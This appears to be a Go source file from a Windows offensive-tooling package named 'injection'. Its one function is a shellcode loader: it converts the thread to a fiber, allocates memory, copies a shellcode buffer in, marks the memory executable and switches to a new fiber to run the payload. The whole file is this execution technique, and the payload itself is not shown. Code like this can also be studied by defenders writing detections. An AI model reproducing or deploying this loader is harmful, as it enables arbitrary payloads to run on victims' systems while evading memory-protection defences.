//go:build windows
// +build windows

package injection

import (
	"fmt"
	"unsafe"
)

func CreateFiberThread() {
	fmt.Println("Starting CreateFiberThread")
	// Convert main thread to Fiber
	fiberAddr, _, _ := ConvertThreadToFiber.Call()

	// Allocate mem for shellcode
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	// Copy shellcode to allocated mem space
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	// Change permissions on address space
	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	// Call shellcode on createfiber
	fiber, _, _ := CreateFiber.Call(0, addr, 0)

	// Switch active fiber to run shellcode
	SwitchToFiber.Call(fiber)

	// Switch back to main thread
	SwitchToFiber.Call(fiberAddr)
	fmt.Println("Finished CreateFiberThread")
}
